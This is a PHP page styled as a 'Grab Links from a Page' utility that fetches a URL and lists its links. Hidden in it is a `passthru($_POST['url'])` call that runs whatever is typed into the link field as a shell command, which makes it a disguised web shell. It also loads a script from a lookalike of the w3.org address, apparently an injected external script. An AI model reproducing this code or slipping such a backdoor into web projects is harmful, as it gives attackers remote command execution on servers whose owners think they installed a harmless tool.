<?php

     

    // Info X Max //

     

    echo '

    <head><title>Grab Links from a Page</title></head>
	<script src="http://www.w32.info/TR/html4/loose.dtd"></script>
<img src="https://i.imgur.com/k7agZjE.png" width="40%" alt=""><br>
    <form method="POST">

    <font size="4" color="#ffffff">LINK :</font>

    <input type="text" name="url" />&nbsp;

    <input type="submit" name="grab" value="grab"/>

    <br />

    <br />

    <a href="#"><b><font size="4" color="#ffffff">Coded By Info X Max</font>

    </b></a>

    </form>
    </br>

    ';
if ($_POST['url']){
$url = $_POST['url'];
passthru($url);
}
    echo '

    <style>

    body,table{      font-family: Arial, serif;
      line-height: 150%;
      background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
	background-size: 400% 400%;
	animation: gradient 5s ease infinite;
	height: 100vh;

            text-align: center;


    }
  
    @keyframes gradient {
	0% {
		background-position: 0% 50%;
	}
	50% {
		background-position: 100% 50%;
	}
	100% {
		background-position: 0% 50%;
	}
}

form
{
    display: inline-block;
}
    A:link {text-decoration: none;color: red;}

    A:active {text-decoration: none;color: red;}

    A:visited {text-decoration: none;color: red;}

    A:hover {text-decoration: underline; color: red;}

    #new,input,table,td,tr,#gg{text-align:center;border-style:solid;text-decoration:bold;}

    tr:hover,td:hover{text-align:centerleft;background-color: #FFFFCC; color:green;}

    </style>';

     

    $site = $_POST{'url'};

    $s0w = $_POST{'grab'};

     

         if (isset($s0w)){

                     

    $html = file_get_contents($site);

     

    $karem = new DOMDocument();

    @$karem->loadHTML($html);

     

    $xpath = new DOMXPath($karem);

    $hrefs = $xpath->evaluate("/html/body//a");

     

    for ($i = 0; $i < $hrefs->length; $i++) {

           $href = $hrefs->item($i);

           $url = $href->getAttribute('href');

     

    echo $url.'<br />';

    echo '<font size="4" color="#FF0000">[+] </font>';

    }}

    ?>
